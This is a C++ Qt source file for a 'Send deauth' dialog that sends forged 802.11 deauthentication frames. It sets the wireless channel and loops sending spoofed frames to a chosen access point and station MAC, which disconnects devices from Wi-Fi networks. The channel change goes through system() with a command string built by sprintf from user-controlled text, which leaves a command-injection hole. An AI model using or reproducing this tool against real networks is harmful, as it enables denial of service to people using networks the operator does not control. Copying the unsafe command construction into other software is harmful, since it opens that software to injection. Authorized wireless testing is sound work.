#include "senddialog.h"
#include "ui_senddialog.h"

SendDialog::SendDialog(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::SendDialog)
{
    ui->setupUi(this);

    this->setWindowTitle("Send deauth");

    pcap_findalldevs(&alldevsp, errbuf);

    for(dev = alldevsp; dev ; dev = dev->next)
    {
        ui->comboBox_Dev->addItem(dev->name);
    }

    pcap_freealldevs(alldevsp);

    ui->spinBox_Ch->setRange(1, 14);
    ui->spinBox_Count->setRange(1, 100);
    ui->spinBox_Count->setValue(15);

    ui->horizontalSlider->setRange(1, 100);

    ui->progressBar->setRange(0, 100);
    ui->progressBar->setValue(0);

    ui->lineEdit_AP->setInputMask("HH:HH:HH:HH:HH:HH;");
    ui->lineEdit_STA->setInputMask("HH:HH:HH:HH:HH:HH;");
}

SendDialog::~SendDialog()
{
    delete ui;
}

void SendDialog::setData(QString AP, QString STA, int channel, QString interface)
{
    ui->lineEdit_AP->setText(AP);
    ui->lineEdit_STA->setText(STA);
    ui->spinBox_Ch->setValue(channel);
    ui->comboBox_Dev->setCurrentText("wlan4");
}

void SendDialog::on_pbSend_clicked()
{
    int count = ui->spinBox_Count->text().toInt();
    sprintf(command, "iwconfig %s channel %d", ui->comboBox_Dev->currentText().toStdString().c_str(), ui->spinBox_Ch->text().toInt());
    system(command);

    ui->progressBar->setValue(0);

    Dot11::address_type ap = ui->lineEdit_AP->text().toStdString();
    Dot11::address_type sta = ui->lineEdit_STA->text().toStdString();

    RadioTap radio = RadioTap();

    Dot11Deauthentication deauth = Dot11Deauthentication();

    deauth.addr1(sta);   // destination
    deauth.addr2(ap);  // source
    deauth.addr3(ap);   // bssid

    radio.inner_pdu(deauth);

    PacketSender sender;
    for (int i = 1; i <= count; i++)
    {
      sender.send(radio, ui->comboBox_Dev->currentText().toStdString().c_str());
      ui->progressBar->setValue((double)i/(double)count*100);
      usleep(10000);
    }
}

void SendDialog::on_pbQuit_clicked()
{
    this->close();
}
